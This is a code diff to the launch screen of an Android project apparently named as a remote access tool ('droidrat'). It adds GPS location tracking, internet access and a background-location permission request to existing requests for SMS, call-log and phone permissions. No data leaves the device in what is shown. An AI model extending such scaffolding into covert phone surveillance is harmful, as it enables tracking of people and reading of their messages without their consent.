@@ -3,25 +3,26 @@ package com.je_chen.droidrat_je.activity;
 import android.Manifest;
 import android.content.Context;
 import android.content.pm.PackageManager;
-import android.hardware.Sensor;
 import android.hardware.SensorManager;
+import android.location.LocationManager;
 import android.os.Build;
 import android.os.Bundle;
-import android.os.Vibrator;
 import android.view.View;
 import android.widget.Button;
-import android.widget.Toast;
 
 import androidx.appcompat.app.AppCompatActivity;
 
 import com.je_chen.droidrat_je.R;
 import com.je_chen.droidrat_je.appintent.call.Call;
 import com.je_chen.droidrat_je.appintent.mail.SendMail;
+import com.je_chen.droidrat_je.appintent.sms.SMS;
 import com.je_chen.droidrat_je.appintent.web.Web;
 import com.je_chen.droidrat_je.appsinfo.checkpermission.PermissionsCheck;
-import com.je_chen.droidrat_je.sms.SMS;
+import com.je_chen.droidrat_je.location.LocationSystem;
 import com.je_chen.droidrat_je.vibrator.VibratorSystem;
 
+import java.util.ArrayList;
+import java.util.Arrays;
 import java.util.List;
 
 public class LaunchActivity extends AppCompatActivity implements View.OnClickListener {
@@ -41,6 +42,8 @@ public class LaunchActivity extends AppCompatActivity implements View.OnClickLis
 
     VibratorSystem vibratorSystem;
 
+    LocationSystem locationSystem;
+
     PermissionsCheck permissionsCheck;
 
     Button testButton;
@@ -51,7 +54,10 @@ public class LaunchActivity extends AppCompatActivity implements View.OnClickLis
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_lanuch);
 
-        String[] requestPermission = new String[]{
+        packageManager = getPackageManager();
+        permissionsCheck = new PermissionsCheck(packageManager);
+
+        String[] requestPermission ={
                 // PHONE
                 Manifest.permission.CALL_PHONE,
                 Manifest.permission.READ_CALL_LOG,
@@ -66,23 +72,29 @@ public class LaunchActivity extends AppCompatActivity implements View.OnClickLis
                 Manifest.permission.READ_SMS,
 
                 //震動
-                Manifest.permission.VIBRATE
+                Manifest.permission.VIBRATE,
+
+                //網路
+                Manifest.permission.INTERNET
         };
 
-        packageManager = getPackageManager();
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            System.out.println(Arrays.toString(requestPermission));
+            permissionsCheck.checkPermission(this,requestPermission);
+        }
+        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            permissionsCheck.checkPermission(this,Manifest.permission.ACCESS_BACKGROUND_LOCATION);
+        }
+
         sensorManager = (SensorManager) getSystemService(Context.SENSOR_SERVICE);
+        LocationManager locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
 
         call = new Call();
         web = new Web();
         sendMail = new SendMail();
         sms = new SMS();
         vibratorSystem = new VibratorSystem(this);
-
-        permissionsCheck = new PermissionsCheck(packageManager);
-
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            permissionsCheck.checkPermission(this, requestPermission);
-        }
+        locationSystem = new LocationSystem(locationManager, "gps", 5000, 5);
 
         testButton = findViewById(R.id.testButton);
         testButton.setOnClickListener(this);
@@ -108,6 +120,7 @@ public class LaunchActivity extends AppCompatActivity implements View.OnClickLis
     public void onClick(View view) {
         switch (view.getId()) {
             case R.id.testButton:
+
                 break;
         }
     }
